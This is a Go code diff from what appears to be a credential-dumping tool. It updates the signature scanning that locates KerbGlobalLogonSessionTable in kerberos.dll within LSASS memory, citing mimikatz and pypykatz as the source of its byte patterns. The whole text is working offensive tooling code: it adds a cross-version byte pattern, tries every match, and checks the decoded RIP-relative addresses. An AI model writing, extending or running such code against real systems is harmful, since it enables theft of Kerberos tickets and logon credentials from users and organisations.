@@ -40,35 +40,33 @@ type kerbTableVariant struct {
 
 // kerbTableVariants lists sigscan patterns for KerbGlobalLogonSessionTable.
 // The instruction before each pattern is a `lea rax, [rip+disp32]` (7 bytes)
-// or `mov rax, [rip+disp32]` (7 bytes) that loads the table address. The
-// disp32 field's last byte is at match_start - 1, so disp32 starts at
-// match_start - 4.
+// that loads the table address into rax. The disp32 ends right where the
+// pattern starts (DispOffset = -4 means the 4-byte displacement field is
+// at match_start - 4).
 //
-// Patterns derived from mimikatz kuhl_m_sekurlsa_kerberos.c and pypykatz
-// lsa_template_nt6.py KerberosTemplate. Tried in newest-first order.
+// All Windows 10/11/Server builds use the same core pattern: the compiler
+// generates `mov rbx, [rax]` / `test rbx, rbx` / `jz` right after the lea.
+// The pattern `48 8B 18 48 85 DB 74` (rbx variant) is consistent across
+// Win10 1507 through Win11 24H2 per pypykatz and mimikatz.
+//
+// Since the 7-byte pattern can have false positive matches, findKerbSessionTable
+// tries ALL matches (not just the first) and validates each resolved address.
 var kerbTableVariants = []kerbTableVariant{
 	{
-		// Win11 24H2+ and Win10 22H1+ (rcx variant, short jz)
-		Name:       "Win11_24H2_Win10_22H1",
-		Signature:  "48 8B 08 48 85 C9 74 ?? EB",
-		DispOffset: -4,
-	},
-	{
-		// Win10 1803 / Server 2019 (rcx variant, longer jz target)
-		Name:       "Win10_1803_Server2019",
-		Signature:  "48 8B 08 48 85 C9 74 ?? 48",
-		DispOffset: -4,
-	},
-	{
-		// Win10 1507-1703 (rbx variant)
-		Name:       "Win10_1507_1703",
+		// Universal rbx variant: mov rbx, [rax] / test rbx, rbx / jz
+		// Works across Win10 1507 through Win11 24H2 / Server 2016-2025.
+		Name:       "Universal_rbx",
 		Signature:  "48 8B 18 48 85 DB 74",
 		DispOffset: -4,
 	},
 }
 
 // findKerbSessionTable scans a kerberos.dll image for the KerbGlobalLogonSessionTable
-// address using build-specific signature patterns.
+// address using signature patterns. Since the short pattern can match at
+// multiple locations (false positives), ALL matches are tried and the resolved
+// target is validated: it must fall within the module image AND the preceding
+// 7 bytes must look like a plausible lea/mov RIP-relative instruction
+// (REX.W prefix 0x48 or 0x4C at instruction start).
 // Returns the LSASS-virtual address of the table head and the matched variant name.
 func findKerbSessionTable(kerbDllBytes []byte, kerbDllBase uintptr) (uintptr, string, error) {
 	var lastErr error
@@ -78,24 +76,46 @@ func findKerbSessionTable(kerbDllBytes []byte, kerbDllBase uintptr) (uintptr, st
 			lastErr = fmt.Errorf("internal: bad signature %q: %w", v.Name, err)
 			continue
 		}
-		hit := findPattern(kerbDllBytes, pat, mask)
-		if hit < 0 {
+		hits := findAllPatterns(kerbDllBytes, pat, mask, 32)
+		if len(hits) == 0 {
 			continue
 		}
 
-		dispStart := hit + v.DispOffset
-		if dispStart < 0 || dispStart+4 > len(kerbDllBytes) {
-			lastErr = fmt.Errorf("variant %q: disp32 field at offset %d outside buffer (size %d)", v.Name, dispStart, len(kerbDllBytes))
-			continue
+		for _, hit := range hits {
+			dispStart := hit + v.DispOffset
+			if dispStart < 0 || dispStart+4 > len(kerbDllBytes) {
+				continue
+			}
+
+			// Verify the preceding instruction looks like a REX.W lea/mov
+			instrStart := dispStart - 3 // 7-byte instruction: REX(1) + opcode(1) + ModRM(1) + disp32(4)
+			if instrStart < 0 {
+				continue
+			}
+			prefix := kerbDllBytes[instrStart]
+			if prefix != 0x48 && prefix != 0x4C {
+				continue // not a REX.W prefix
+			}
+			opcode := kerbDllBytes[instrStart+1]
+			if opcode != 0x8D && opcode != 0x8B {
+				continue // not LEA (0x8D) or MOV (0x8B)
+			}
+
+			disp := int32(binary.LittleEndian.Uint32(kerbDllBytes[dispStart : dispStart+4]))
+			targetOffset := hit + int(disp)
+			if targetOffset < 0 || targetOffset >= len(kerbDllBytes) {
+				continue
+			}
+
+			// Target should be in the data section (upper portion of the module)
+			// Heuristic: target should be in the upper 75% of the module
+			if targetOffset < len(kerbDllBytes)/4 {
+				continue
+			}
+
+			return kerbDllBase + uintptr(targetOffset), v.Name, nil
 		}
-		disp := int32(binary.LittleEndian.Uint32(kerbDllBytes[dispStart : dispStart+4]))
-		// RIP for the displacement is at the end of the disp32 field = hit
-		targetOffset := hit + int(disp)
-		if targetOffset < 0 || targetOffset >= len(kerbDllBytes) {
-			lastErr = fmt.Errorf("variant %q: resolved target offset %d outside buffer (size %d)", v.Name, targetOffset, len(kerbDllBytes))
-			continue
-		}
-		return kerbDllBase + uintptr(targetOffset), v.Name, nil
+		lastErr = fmt.Errorf("variant %q: %d matches, none had valid target", v.Name, len(hits))
 	}
 	if lastErr != nil {
 		return 0, "", fmt.Errorf("KerbGlobalLogonSessionTable: no variant matched in %d-byte kerberos.dll (last error: %w)", len(kerbDllBytes), lastErr)
